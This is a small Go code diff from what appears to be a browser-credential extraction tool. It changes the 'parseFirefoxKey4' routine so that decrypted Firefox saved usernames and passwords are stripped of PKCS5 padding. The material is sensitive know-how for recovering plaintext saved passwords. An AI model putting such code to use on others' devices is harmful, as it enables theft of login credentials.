@@ -504,8 +504,8 @@ func parseFirefoxKey4() {
 				}
 				FullData.LoginDataSlice = append(FullData.LoginDataSlice, loginData{
 					LoginUrl:   v.LoginUrl,
-					UserName:   string(u),
-					Password:   string(p),
+					UserName:   string(utils.PKCS5UnPadding(u)),
+					Password:   string(utils.PKCS5UnPadding(p)),
 					CreateDate: v.CreateDate,
 				})
 			}
